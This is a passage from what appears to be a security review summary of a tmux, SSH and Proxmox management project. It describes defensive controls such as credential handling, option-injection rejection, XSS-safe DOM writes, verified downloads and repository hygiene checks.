  seal secrets at rest and redact every read response. `aiAuthSeed.js` delivers Claude/Codex
  credentials strictly via `stdin` (`0o600` `~/.tmuxifier-auth/claude-token` on the box, secret-free
  tagged rc export line). `fcmPush.js` signs RS256 OAuth assertions with `node:crypto` and clears
  only `fcmToken` (never device auth) on `UNREGISTERED`.
- **SSH argv builders, tmux target isolation, and setup ordering.** Every SSH builder runs
  `assertBoxSafe` with leading-`-` option-injection rejection; `SESSION_NAME_RE` and `WINDOW_ID_RE`
  validate explicit names at route boundaries without silent rewriting; remote tmux commands use
  exact `-t '=session'` and session-qualified `-t '=session:@id'` targets (with `B6` as the sole
  exception); setup runs rc-mutating phases before `ensureSession` (last); `/etc/os-release` is
  parsed with shell built-ins under a bare PATH, never sourced.
- **Proxmox guest identity, QEMU/LXC separation, and cross-cluster follow.** Guest `kind` is always
  derived from cluster inventory rather than request bodies; `mismatch`, `unknown`, and template
  guests are refused across link pickers and lifecycle actions; cross-cluster fingerprint follow
  refuses ambiguous twin VMIDs and locked guests; `deprovision` refuses missing guests that moved
  clusters.
- **Claude voice link and local whisper pipeline.** `~/.asoundrc` is marker-guarded so foreign ALSA
  configs are untouched; the resident silence feeder + `mic.absent` symlink handover prevent both
  `snd_pcm_open` writerless-FIFO hangs and `/dev/zero` memory blowups; writer handover is serialized
  by `flock`; `voiceInstall.js` pins the `whisper.cpp` commit SHA and streams models through
  SHA-256 verification before atomic rename (`downloadVerified`).
- **Web XSS, `http.ts` 401 seam, and theme token parity.** Every `fetch` in `src/web/` routes
  through `http.ts` (enforced by `test/webHttp.test.js`); server- and box-sourced strings land via
  DOM text APIs (`textContent`, `el()`, `title`) with no untrusted `innerHTML`; `original.css` and
  `vercel.css` maintain full custom-property parity with the root Instrument token set in
  `style.css` (pinned by `test/themes.test.js`).
- **Repository hygiene and test health.** Tracked-file scan found zero real secrets, keys, tokens,
  or private infrastructure PII; `.gitignore` covers `.env`, `config.json`, `tls/`, `data/`,
  `vendor/`, `.mcp.json`, and Android signing/local files; zero `.only` or `.skip` across all 204
  Vitest files, 20 Playwright specs, and 10 Android JUnit suites.
